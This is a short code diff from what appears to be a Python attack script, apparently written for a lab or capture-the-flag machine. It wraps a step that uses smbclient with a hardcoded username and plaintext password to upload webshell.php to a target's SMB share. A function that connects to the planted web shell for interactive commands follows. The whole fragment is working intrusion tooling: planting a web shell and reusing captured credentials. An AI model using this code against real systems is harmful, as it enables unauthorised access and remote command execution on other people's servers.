@@ -17,8 +17,11 @@ PORT = "8808"
 SHELL_PATH = "webshell.php"
 URL = f"http://{TARGET_IP}:{PORT}/{SHELL_PATH}"
 
-# setup web shell
-os.system(f'''smbclient '//{TARGET_IP}/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put ./webshell.php webshell.php' ''')
+def ensure_webshell(ip):
+    # setup web shell
+    os.system(f'''smbclient '//{ip}/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put ./webshell.php webshell.php' ''')
+
+ensure_webshell(TARGET_IP)
 
 def shell_repl():
     print(f"[*] Connecting to web shell at: {URL}")
